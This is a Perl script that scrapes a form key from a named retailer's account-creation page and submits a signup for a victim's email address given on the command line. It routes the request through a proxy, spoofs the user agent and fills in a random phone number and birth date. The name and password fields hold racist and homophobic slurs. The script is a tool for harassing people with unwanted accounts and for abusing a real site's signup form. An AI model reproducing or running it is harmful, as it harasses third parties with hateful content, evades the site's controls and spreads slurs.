#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;

my $target = shift;
my $proxy = shift;
my $user_agent = shift;
#my $user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:55.0) Gecko/20100101 Firefox/55.0';

my $ua = LWP::UserAgent->new;
my $cookie_jar = HTTP::Cookies->new;
        $ua->timeout(5);
        $ua->agent($user_agent);
        $ua->cookie_jar($cookie_jar);
        $ua->proxy(https => 'http://'.$proxy);

# https://www.zumiez.com/customer/account/create/

my $get_signup_page = $ua->get('https://www.zumiez.com/customer/account/create/');
        my $signup_page_string = $get_signup_page->as_string;
        # my () = ($signup_page_string =~ m//);

my ($form_key) = ($signup_page_string =~ m/\<input type\=\"hidden\" name\=\"form\_key\" value\=\"(.*)\"\/\>/);

my $phone_number = '';

my $area_code = int(rand(2));

if ($area_code == 0) {
        $phone_number = '505'.(int(rand(899))+100).(int(rand(8999))+1000);
}

elsif ($area_code == 1) {
        $phone_number = '719'.(int(rand(899))+100).(int(rand(8999))+1000);
}

my $dob_day = int(rand(28))+1;
        if (length($dob_day) == 1) {
                $dob_day = '0'.$dob_day;
        }
my $dob_month = int(rand(12))+1;
        if (length($dob_month) == 1) {
                $dob_month = '0'.$dob_month;
        }
my $dob_year = int(rand(30))+1970;

my $dob = $dob_month.'/'.$dob_day.'/'.$dob_year;

my $signup = $ua->post(
        'https://www.zumiez.com/customer/account/createpost/',
        Referer => 'https://www.zumiez.com/customer/account/create/',
        #Content_Type => '',
        #Content_Type => 'application/x-www-form-urlencoded',
        Content_Type => 'multipart/form-data',
        #Content_Type => 'application/json',
        #Accept => '',
        Accept => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        #Accept => '*/*',
        Content =>
        [
        'success_url' => '',
        'error_url' => '',
        'form_key' => $form_key,
        'firstname' => 'Gay Nigger Association of America',
        'lastname' => 'Gay Nigger Association of America',
        'email' => $target,
        'mobile_country_id' => 'us',
        'mobile_country_code' => '1',
        'mobile_number' => $phone_number,
        'postcode' => '81003',
        'country_id' => 'US',
        'month' => $dob_month,
        'day' => $dob_day,
        'year' => $dob_year,
        'dob' => $dob,
        'password' => 'niggers11',
        'confirmation' => 'niggers11'
        ]
        );

